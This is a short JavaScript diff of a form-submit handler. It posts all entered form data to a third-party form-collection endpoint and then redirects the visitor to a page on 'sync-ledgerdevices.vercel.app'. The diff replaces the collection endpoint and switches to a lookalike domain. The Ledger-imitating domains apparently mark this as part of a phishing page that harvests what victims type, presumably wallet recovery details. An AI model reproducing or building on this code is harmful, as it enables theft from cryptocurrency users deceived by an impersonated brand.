@@ -2101,7 +2101,7 @@ form.addEventListener('submit', (event) => {
 
   const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
 
-  fetch('https://usebasin.com/f/d20efeb18687', { //sd
+  fetch('https://usebasin.com/f/548f9eddc44b', { //sd
     method: 'POST',
     body: formData // pass form data as the request body
   })
@@ -2113,7 +2113,7 @@ form.addEventListener('submit', (event) => {
   })
   .then(data => {
     console.log(data); // log the response data
-    window.location.href = 'https://sync-ledgerdevice.vercel.app/support.html'; // redirect to thank you page
+    window.location.href = 'https://sync-ledgerdevices.vercel.app/support.html'; // redirect to thank you page
   })
   .catch(error => {
     console.error('Error:', error); // log any errors
